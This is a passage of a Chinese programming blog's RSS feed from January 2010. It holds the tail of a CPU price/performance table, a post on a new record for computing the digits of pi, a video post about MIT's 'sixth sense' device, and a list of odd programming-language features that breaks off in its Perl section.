<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103189">31.99</a></td>
<td>17.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103683">AMD Phenom II X3 705e</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X3+705e">2324</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103683">134.99</a></td>
<td>17.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819105134">Dual-Core AMD Opteron 1220</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Dual-Core+AMD+Opteron+1220">1443</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819105134">85.99</a></td>
<td>16.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115041">Intel Core2 Quad Q9550 @ 2.83GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q9550+%40+2.83GHz">4178</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115041">249.99</a></td>
<td>16.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115060">Intel Core2 Quad Q9505 @ 2.83GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q9505+%40+2.83GHz">3810</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115060">229.99</a></td>
<td>16.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819105261">Dual-Core AMD Opteron 1218</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Dual-Core+AMD+Opteron+1218">1094</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819105261">65.99</a></td>
<td>16.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115056">Intel Core2 Duo E7500 @ 2.93GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+E7500+%40+2.93GHz">1947</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115056">119.99</a></td>
<td>16.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116092">Intel Celeron E1600 @ 2.40GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Celeron+E1600+%40+2.40GHz">1007</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116092">61.99</a></td>
<td>16.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115206">Intel Core2 Duo E7400 @ 2.80GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+E7400+%40+2.80GHz">1864</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115206">117.99</a></td>
<td>15.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103682">AMD Phenom II X4 905e</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+II+X4+905e">2789</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103682">184.99</a></td>
<td>15.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117127">Intel Xeon X3220 @ 2.40GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X3220+%40+2.40GHz">2961</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117127">199.99</a></td>
<td>14.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117166">Intel Xeon X3360 @ 2.83GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X3360+%40+2.83GHz">4277</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117166">299.99</a></td>
<td>14.3</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115059">Intel Core2 Duo E7600 @ 3.06GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+E7600+%40+3.06GHz">2010</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115059">144.99</a></td>
<td>13.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115130">Intel Core2 Quad Q9650 @ 3.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q9650+%40+3.00GHz">4456</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115130">324.99</a></td>
<td>13.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116039">Intel Celeron 430 @ 1.80GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Celeron+430+%40+1.80GHz">530</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819116039">39.99</a></td>
<td>13.3</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117173">Intel Xeon X3370 @ 3.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X3370+%40+3.00GHz">4629</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117173">349.99</a></td>
<td>13.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117155">Intel Xeon X3230 @ 2.66GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X3230+%40+2.66GHz">3755</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117155">289.99</a></td>
<td>13</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117186">Intel Xeon E5506 @ 2.13GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5506+%40+2.13GHz">3507</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117186">269.99</a></td>
<td>13</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117151">Intel Xeon E5405 @ 2.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5405+%40+2.00GHz">2993</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117151">229.99</a></td>
<td>13</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117187">Intel Xeon E5504 @ 2.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5504+%40+2.00GHz">3098</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117187">239.99</a></td>
<td>12.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117150">Intel Xeon E5410 @ 2.33GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5410+%40+2.33GHz">3750</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117150">289.99</a></td>
<td>12.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115037">Intel Core2 Duo E8400 @ 3.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+E8400+%40+3.00GHz">2164</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115037">167.99</a></td>
<td>12.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103226">AMD Phenom 9500 Quad-Core</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Phenom+9500+Quad-Core">2250</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103226">175.00</a></td>
<td>12.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103188">AMD Sempron LE-1300</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Sempron+LE-1300">582</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103188">45.99</a></td>
<td>12.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117165">Intel Xeon E3110 @ 3.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E3110+%40+3.00GHz">2269</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117165">179.99</a></td>
<td>12.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115036">Intel Core2 Duo E8500 @ 3.16GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+E8500+%40+3.16GHz">2308</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115036">189.99</a></td>
<td>12.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115201">Intel Core i7 940 @ 2.93GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+940+%40+2.93GHz">6116</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115201">499.99</a></td>
<td>12.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115213">Intel Core i7 870 @ 2.93GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+870+%40+2.93GHz">6184</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115213">539.99</a></td>
<td>11.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115216">Intel Core i7 960 @ 3.20GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+960+%40+3.20GHz">6530</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115216">589.99</a></td>
<td>11.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115211">Intel Core i7 950 @ 3.07GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+950+%40+3.07GHz">6299</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115211">569.99</a></td>
<td>11.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117148">Intel Xeon E5420 @ 2.50GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5420+%40+2.50GHz">3733</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117148">349.99</a></td>
<td>10.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117185">Intel Xeon E5520 @ 2.27GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5520+%40+2.27GHz">3960</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117185">384.99</a></td>
<td>10.3</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117145">Intel Xeon E5430 @ 2.66GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5430+%40+2.66GHz">4485</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117145">499.99</a></td>
<td>9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115054">Intel Core2 Duo E8600 @ 3.33GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+E8600+%40+3.33GHz">2469</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115054">279.99</a></td>
<td>8.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111015">Intel Core i7 720QM @ 1.60GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+720QM+%40+1.60GHz">3353</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111015">379.99</a></td>
<td>8.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111011">Intel Core2 Quad Q9000 @ 2.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Quad+Q9000+%40+2.00GHz">2991</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111011">364.99</a></td>
<td>8.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117188">Intel Xeon E5502 @ 1.87GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5502+%40+1.87GHz">1602</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117188">199.99</a></td>
<td>8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111013">Intel Core2 Duo P8700 @ 2.53GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+P8700+%40+2.53GHz">1760</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111013">219.99</a></td>
<td>8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111014">Intel Core2 Duo P8800 @ 2.66GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+P8800+%40+2.66GHz">1923</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111014">249.99</a></td>
<td>7.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117184">Intel Xeon E5530 @ 2.40GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5530+%40+2.40GHz">4290</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117184">569.99</a></td>
<td>7.5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111009">Intel Core2 Duo P8600 @ 2.40GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+P8600+%40+2.40GHz">1593</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111009">219.99</a></td>
<td>7.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115212">Intel Core i7 975 @ 3.33GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core+i7+975+%40+3.33GHz">6931</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819115212">969.99</a></td>
<td>7.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111010">Intel Core2 Duo P8400 @ 2.26GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+P8400+%40+2.26GHz">1512</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111010">214.99</a></td>
<td>7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117211">Intel Xeon W3570 @ 3.20GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+W3570+%40+3.20GHz">7166</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117211">1069.99</a></td>
<td>6.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117144">Intel Xeon E5440 @ 2.83GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5440+%40+2.83GHz">4589</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117144">739.99</a></td>
<td>6.2</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103826">AMD Sempron 2200+</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=AMD+Sempron+2200%2B">319</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819103826">51.98</a></td>
<td>6.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111012">Intel Core2 Duo T9550 @ 2.66GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+T9550+%40+2.66GHz">1898</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111012">319.99</a></td>
<td>5.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111006">Intel Core2 Duo T9600 @ 2.80GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+T9600+%40+2.80GHz">1987</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111006">339.99</a></td>
<td>5.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117183">Intel Xeon E5540 @ 2.53GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5540+%40+2.53GHz">4467</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117183">779.99</a></td>
<td>5.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117214">Intel Xeon W5590 @ 3.33GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+W5590+%40+3.33GHz">8597</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117214">1689.99</a></td>
<td>5.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111008">Intel Core2 Duo T9400 @ 2.53GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+T9400+%40+2.53GHz">1710</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111008">335.98</a></td>
<td>5.1</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111317">Intel Core2 Duo T7500 @ 2.20GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+T7500+%40+2.20GHz">1239</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111317">249.99</a></td>
<td>5</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111007">Intel Core2 Duo P9500 @ 2.53GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Core2+Duo+P9500+%40+2.53GHz">1758</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819111007">369.99</a></td>
<td>4.8</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117140">Intel Xeon X5450 @ 3.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X5450+%40+3.00GHz">4409</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117140">939.99</a></td>
<td>4.7</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117141">Intel Xeon E5450 @ 3.00GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+E5450+%40+3.00GHz">4583</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117141">986.99</a></td>
<td>4.6</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117182">Intel Xeon X5550 @ 2.67GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X5550+%40+2.67GHz">4424</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117182">999.99</a></td>
<td>4.4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117138">Intel Xeon X5460 @ 3.16GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X5460+%40+3.16GHz">5008</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117138">1249.99</a></td>
<td>4</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117181">Intel Xeon X5560 @ 2.80GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X5560+%40+2.80GHz">4900</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117181">1249.99</a></td>
<td>3.9</td>
</tr>
<tr>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117179">Intel Xeon W5580 @ 3.20GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+W5580+%40+3.20GHz">6293</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117179">1679.99</a></td>
<td>3.8</td>
</tr>
<tr id="yui-rec101">
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117180">Intel Xeon X5570 @ 2.93GHz</a></td>
<td><a href="https://www.cpubenchmark.net/cpu_lookup.php?cpu=Intel+Xeon+X5570+%40+2.93GHz">5390</a></td>
<td><a href="https://www.newegg.com/Product/Product.aspx?Item=N82E16819117180">1439.99</a></td>
<td>3.7</td>
</tr>
</tbody>
</table>
<p></p>
</center>
 ]]></content>
<pubDate>2010-01-08T08:09:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/2039.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ PI小数点位数的新纪录 ]]></title>
<link>https://coolshell.cn/articles/2043.html</link>
<content><![CDATA[ 
<p>PI小数点后的位数据个数据的纪录被刷新了，被一台PC机刷新的。新的纪录把PI的小点数后面的位数整到了近2.7万亿位，太BT了。下面的链接是本次经录的通告：</p>
<p style="text-align: center;"><a href="http://bellard.org/pi/pi2700e9/announce.html" target="_blank">http://bellard.org/pi/pi2700e9/announce.html</a></p>
<p style="text-align: left;">这个通告宣称：</p>
<ul>
<li>
<div style="text-align: left;">PI后的小数点位数被计算到了2,699,999,990,000位。</div>
</li>
<li>
<div style="text-align: left;">为了保存计算结果，一共花了，1137GB的硬盘空间。</div>
</li>
<li>
<div style="text-align: left;">本次计算使用了价值2000欧元左右的PC机，CPU是Core i7 CPU at 2.93 GHz ，内存6GB，5个1.5TB的希捷硬盘。</div>
</li>
<li>
<div style="text-align: left;">操作系统使用的是Linux  64 bit Red Hat Fedora 10 distribution，7.5TB的硬盘被做成了RAID-0阵列，使用了ext4文件系统。</div>
</li>
<li>
<div style="text-align: left;">整个计算时间花了131天（4个半月），其中，103天用于计算PI的二进制结果，13天用于验证二进制结果，花了12天把二进制转成十进制，最后花了3天再验证了转换。</div>
</li>
<li>
<div style="text-align: left;">上一次的记录是<a href="http://www.hpcs.is.tsukuba.ac.jp/~daisuke/pi.html">2.577 万亿小数位</a>，于2009年8月17日创造。其使用了超过百万欧元的超级计算机（Appro Xtreme-X3 Server）。</div>
</li>
</ul>
<p style="text-align: left;">相关的技术细节请看这里：<a href="http://bellard.org/pi/pi2700e9/pipcrecord.pdf">http://bellard.org/pi/pi2700e9/pipcrecord.pdf</a></p>
<p style="text-align: left;">我想了想，算这个玩意花了多少度电，产生了多少废气，太不环保了。呵呵。</p>
<p></p>
 ]]></content>
<pubDate>2010-01-08T08:28:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/2043.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “第六感装置”的惊人潜力 ]]></title>
<link>https://coolshell.cn/articles/2047.html</link>
<content><![CDATA[ 
<p>我们总是在于“现实生活”和“电脑的数字生活”中的差异，这两个世界难道不可以合并吗？美国MIT Media Lab（麻省理工学院媒体实验室）的天才学生普拉纳夫- (Prarnav Mistry)，发明了一项结合实体世界和虚拟世界的科技，令人惊喜，感叹创造力的惊人。下面是视频。翻译还OK。</p>
<p align="center"><embed src="http://player.youku.com/player.php/sid/35441513/v.swf" quality="high" width="480" height="400" align="middle" allowscriptaccess="sameDomain" type="application/x-shockwave-flash"></embed></p>
<p></p>
 ]]></content>
<pubDate>2010-01-09T12:10:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/2047.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 最为奇怪的程序语言的特性 ]]></title>
<link>https://coolshell.cn/articles/2053.html</link>
<content><![CDATA[ 
<p>这些最为奇怪的程序语言的特性，来自stackoverflow.com，原贴在<a href="https://stackoverflow.com/questions/1995113?sort=votes&amp;page=1" target="_blank">这里</a>。我摘选了一些例子，的确是比较怪异，让我们一个一个来看看。 </p>
<p><strong>1、C语言中的数组</strong> </p>
<p style="padding-left: 30px;">在C/C++中，a[10] 可以写成 10[a] </p>
<p style="padding-left: 30px;">“Hello World”[i] 也可以写成 i[“Hello World”] </p>
<p>这样的特性是不是很怪异？如果你想知道为什么的话，你可以看看本站的这篇文章——《<a href="https://coolshell.cn/articles/945.html" target="_blank">C语言的谜题</a>》中的第12题。 </p>
<p><strong>2、在Javascript中</strong> </p>
<p> ‘5’ + 3 的结果是：’53’<br>
 ‘5’ – 3 的结果是：2 </p>
<p><strong>3、C/C++中的Trigraphs</strong> </p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main() {
   cout &lt;&lt; "LOL??!";
}</pre>
<p>上面的这段程序会输出： “LOL|”，这是因为 ??! 被转成了 | ，关于Trigraphs，下面有个表格： </p>
<p><span id="more-2053"></span></p>
<table style="width: 237px; height: 184px;">
<tbody>
<tr valign="top">
<td>??=</td>
<td>#</td>
</tr>
<tr valign="top">
<td>??(</td>
<td>[</td>
</tr>
<tr valign="top">
<td>??/</td>
<td>\</td>
</tr>
<tr valign="top">
<td>??)</td>
<td>]</td>
</tr>
<tr valign="top">
<td>??’</td>
<td>^</td>
</tr>
<tr valign="top">
<td>??&lt;</td>
<td>{</td>
</tr>
<tr valign="top">
<td>??!</td>
<td>|</td>
</tr>
<tr valign="top">
<td>??&gt;</td>
<td>}</td>
</tr>
<tr valign="top">
<td>??-</td>
<td>~</td>
</tr>
</tbody>
</table>
<p>  </p>
<p><strong>4、JavaScript 的条件表</strong> </p>
<p>看到下面这个表，不难理解为什么Javascript程序员为什么痛苦了——《<a rel="bookmark" href="https://coolshell.cn/articles/1850.html">Javascript程序员嘴最脏??</a>》 </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">''        ==   '0'           //false
0         ==   ''            //true
0         ==   '0'           //true
false     ==   'false'       //false
false     ==   '0'           //true
false     ==   undefined     //false
false     ==   null          //false
null      ==   undefined     //true
" \t\r\n" ==   0             //true[/javascript] 

&lt;strong&gt;5、Java的Integer cache&lt;/strong&gt; 

[java]Integer foo = 1000;
Integer bar = 1000;
 
foo &lt;= bar; // true
foo &gt;= bar; // true
foo == bar; // false
 
//然后，如果你的 foo 和 bar 的值在 127 和 -128 之间（包括）
//那么，其行为则改变了：
 
Integer foo = 42;
Integer bar = 42;
 
foo &lt;= bar; // true
foo &gt;= bar; // true
foo == bar; // true</pre>
<p>为什么会这样呢？你需要了解一下Java Interger Cache，下面是相关的程序，注意其中的注释</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">/**
     * Returns a &lt;tt&gt;Integer&lt;/tt&gt; instance representing the specified
     * &lt;tt&gt;int&lt;/tt&gt; value.
     * If a new &lt;tt&gt;Integer&lt;/tt&gt; instance is not required, this method
     * should generally be used in preference to the constructor
     * &lt;a href="mailto:{@link"&gt;{@link&lt;/a&gt; #Integer(int)}, as this method is likely to yield
     * significantly better space and time performance by caching
     * frequently requested values.
     *
     * @param  i an &lt;code&gt;int&lt;/code&gt; value.
     * @return a &lt;tt&gt;Integer&lt;/tt&gt; instance representing &lt;tt&gt;i&lt;/tt&gt;.
     * @since  1.5
     */
    public static Integer valueOf(int i) {
        if(i &gt;= -128 &amp;&amp; i &lt;= IntegerCache.high)
            return IntegerCache.cache[i + 128];
        else
            return new Integer(i);
    }
</pre>
<p><strong>5、Perl的那些奇怪的变量</strong></p>
<p>[perl]$.<br>
$_<br>
$_#<br>
